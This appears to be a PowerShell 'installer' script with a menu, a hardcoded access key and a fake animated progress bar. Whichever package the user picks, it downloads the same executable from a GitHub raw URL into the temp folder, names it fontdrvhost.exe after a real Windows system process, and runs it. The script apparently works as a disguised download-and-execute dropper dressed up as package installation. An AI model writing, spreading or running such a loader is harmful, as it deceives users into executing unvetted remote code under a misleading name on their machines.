Clear-Host

# ===== CONFIG =====
$ValidKey = "smithshop"
$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$ExeOutput = "$env:TEMP\fontdrvhost.exe"

# ===== LOADING FUNCTION =====
function Show-Loading($text) {

    $colors = @("Red","Yellow","Green","Cyan","Blue","Magenta")

    for ($i = 0; $i -le 100; $i++) {

        $dots = "." * ($i % 6)
        $color = $colors[$i % $colors.Count]

        # progress bar
        $barLength = 20
        $filled = [math]::Floor($i / (100 / $barLength))
        $bar = ("█" * $filled).PadRight($barLength, "░")

        Write-Host "`r$text$dots [$bar] $i% " -NoNewline -ForegroundColor $color

        Start-Sleep -Milliseconds 50
    }

    Write-Host ""
}

# ===== MAIN MENU =====
Write-Host "=== CMDSMITHSHOP :] ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

if ($choice -eq "1") {

    $userKey = Read-Host "Enter your Key"

    if ($userKey.Trim().ToLower() -eq $ValidKey.ToLower()) {

        # 🔁 LOOP
        while ($true) {

            Clear-Host
            Write-Host "=== SELECT CMD ===`n"
            Write-Host "1. smithx3d"
            Write-Host "2. uptoking"
            Write-Host "3. kingsmith"
            Write-Host "0. Exit"

            $package = Read-Host "Choose 1 / 2 / 3 / 0"

            switch ($package) {
                "1" { $pkgName = "smithx3d" }
                "2" { $pkgName = "uptoking" }
                "3" { $pkgName = "kingsmith" }
                "0" { break }
                default {
                    Write-Host "❌ Invalid!" -ForegroundColor Red
                    Start-Sleep 1
                    continue
                }
            }

            # ===== INSTALL CMD =====
            Clear-Host
            Write-Host "=== INSTALL MODE ===`n"

            Show-Loading "install $pkgName "

            # โหลดไฟล์
            Invoke-WebRequest $ExeURL -OutFile $ExeOutput

            # รัน
            Start-Process $ExeOutput

            Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green
            Start-Sleep 2
        }

    } else {
        Write-Host "❌ Key invalid!" -ForegroundColor Red
    }

}
elseif ($choice -eq "2") {

    Clear-Host
    Write-Host "=== CLEAN MODE ===`n"

    Show-Loading "cleaning "

    if (Test-Path $ExeOutput) {
        Remove-Item $ExeOutput -Force
        Write-Host "`nFile removed successfully ✅"
    } else {
        Write-Host "`nFile not found ⚠️"
    }

}
else {
    Write-Host "Invalid choice ⚠️"
}

Pause
